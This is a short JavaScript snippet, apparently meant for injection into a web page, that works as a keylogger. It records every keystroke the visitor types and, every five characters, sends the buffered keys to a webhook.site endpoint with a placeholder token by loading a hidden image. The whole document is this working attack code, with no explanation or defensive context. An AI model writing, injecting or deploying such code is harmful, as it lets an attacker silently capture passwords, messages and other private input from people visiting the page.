(function(){
  let buffer = "";
  document.addEventListener('keydown', function(e){
    buffer += e.key;

    if(buffer.length >= 5){
      const img = new Image();
      img.src = "https://webhook.site/tu_token?keys=" + encodeURIComponent(buffer);
      buffer = "";
    }
  });
})();
